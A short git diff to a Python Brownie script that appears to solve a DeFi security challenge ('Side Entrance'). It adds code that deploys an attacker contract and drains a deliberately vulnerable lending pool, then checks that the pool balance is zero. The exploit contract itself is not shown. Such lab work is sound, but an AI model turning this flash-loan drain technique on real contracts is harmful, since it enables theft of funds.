@@ -1,4 +1,4 @@
-from brownie import SideEntranceLenderPool
+from brownie import SideEntranceLenderPool, AttackSideEntrance
 from web3 import Web3
 import time
 from scripts.helpful_scripts import get_accounts
@@ -21,11 +21,14 @@ def deploy():
 def attack():
     # 攻击代码写到这里
     print("running func attack..")
+    attack_contract = AttackSideEntrance.deploy({"from": attacker})
+    attack_contract.attack(pool, attacker)
+
     return
 
 
 def check():
-    # 检测攻击是否完成： 不能继续借贷
+    # 检测攻击是否完成
     print("running func check..")
     try:
         assert pool.balance() == 0
